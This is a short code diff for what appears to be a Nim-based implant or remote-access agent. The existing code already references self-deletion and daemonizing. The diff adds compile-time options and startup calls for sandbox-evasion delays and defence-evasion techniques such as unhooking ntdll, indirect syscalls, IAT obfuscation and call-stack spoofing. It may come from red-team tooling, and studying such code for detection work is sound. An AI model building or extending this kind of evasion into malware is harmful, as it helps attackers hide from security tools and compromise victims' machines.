@@ -18,6 +18,12 @@ else:
       import utils/self_delete
     import winim/lean
 
+    # Evasion imports
+    when defined(evasion_dfr) or defined(evasion_iat_obf) or defined(evasion_unhook_ntdll) or defined(evasion_indirect_syscalls) or defined(evasion_stack_spoof):
+      import utils/evasion
+    when defined(sandbox_evasion):
+      import utils/sandbox
+
   when defined(linux):
     import posix
 
@@ -51,6 +57,16 @@ else:
 
   # Main entry point
   proc main() =
+    # Run sandbox evasion delay before anything else
+    when defined(windows):
+      when defined(sandbox_evasion):
+        runSandboxEvasion()
+
+    # Run evasion techniques as early as possible
+    when defined(windows):
+      when defined(evasion_dfr) or defined(evasion_iat_obf) or defined(evasion_unhook_ntdll) or defined(evasion_indirect_syscalls) or defined(evasion_stack_spoof):
+        runEvasionInit()
+
     # Daemonize if compile flag is set
     when defined(daemonize):
       if daemonize():
